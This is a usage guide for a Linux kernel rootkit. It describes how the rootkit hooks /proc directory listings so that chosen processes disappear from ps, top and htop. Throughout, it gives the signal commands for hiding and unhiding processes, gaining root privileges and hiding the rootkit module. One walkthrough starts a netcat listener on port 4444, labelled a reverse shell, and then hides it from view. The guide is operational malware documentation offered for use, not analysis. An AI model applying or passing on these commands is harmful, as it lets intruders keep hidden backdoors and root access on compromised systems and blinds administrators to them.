# Process Hiding Usage Guide

This rootkit now supports hiding processes from system tools like `ps`, `top`, `htop`, and `/proc` directory listings.

## How Process Hiding Works

The rootkit hooks the `filldir` and `filldir64` functions to intercept directory listings in `/proc`. When a process ID is in the hidden list, its directory entry in `/proc` is filtered out, making the process invisible to most userspace tools.

## Usage Commands

### Hide a Process
```bash
# Hide process with PID 1234
kill -34 1234

# Hide current shell process
kill -34 0
```

### Unhide a Process
```bash
# Unhide process with PID 1234
kill -35 1234

# Unhide current shell process
kill -35 0
```

### Other Existing Commands
```bash
# Get root privileges
kill -10 0

# Hide/show the rootkit module
kill -12 0
```

## Configuration

- **Maximum Hidden PIDs**: 10 (configurable via `HIDE_PID_LIST_SIZE` in config.h)
- **Signal Numbers**: 
  - SIGRTMIN (34): Hide process
  - SIGRTMIN1 (35): Unhide process

## Example Usage Scenario

1. Start a suspicious process (e.g., a reverse shell):
   ```bash
   nc -l -p 4444 &
   echo $!  # Note the PID, e.g., 5678
   ```

2. Hide the process:
   ```bash
   kill -34 5678
   ```

3. Verify it's hidden:
   ```bash
   ps aux | grep nc     # Should not show the netcat process
   ls /proc/5678        # Should show "No such file or directory"
   ```

4. Unhide when needed:
   ```bash
   kill -35 5678
   ```

## Technical Details

- The rootkit maintains an internal list of hidden PIDs
- Process hiding works by filtering `/proc` directory entries
- Hidden processes are still running and functional, just invisible to most tools
- The hiding affects: `ps`, `top`, `htop`, `/proc` listings, and other tools that read from `/proc`

## Limitations

- Maximum of 10 processes can be hidden simultaneously
- Some advanced forensic tools might still detect hidden processes
- Process hiding only affects `/proc` directory listings, not kernel-level process tracking
